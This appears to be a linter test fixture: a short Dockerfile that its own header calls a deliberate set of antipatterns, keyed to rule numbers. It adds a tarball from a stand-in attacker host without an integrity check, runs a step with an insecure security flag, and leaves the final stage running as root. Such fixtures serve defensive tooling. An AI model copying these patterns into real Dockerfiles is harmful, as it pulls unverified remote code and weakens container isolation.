# Deliberate kitchen-sink of Dockerfile antipatterns. DO NOT COPY.
FROM alpine:3 AS builder

# rule 14 — ADD from HTTP URL (no integrity check)
ADD https://get.attacker.example.com/build.tar.gz /tmp/build.tar.gz

RUN apk add --no-cache curl bash

# rule 12 — privileged flag in RUN
RUN --security=insecure echo "escape primitives available"

USER builder

FROM alpine:3
COPY --from=builder /tmp/build.tar.gz /opt/build.tar.gz
# rule 13 — final stage has no USER (implicit root) OR ends as root
# (leaving it out on purpose)
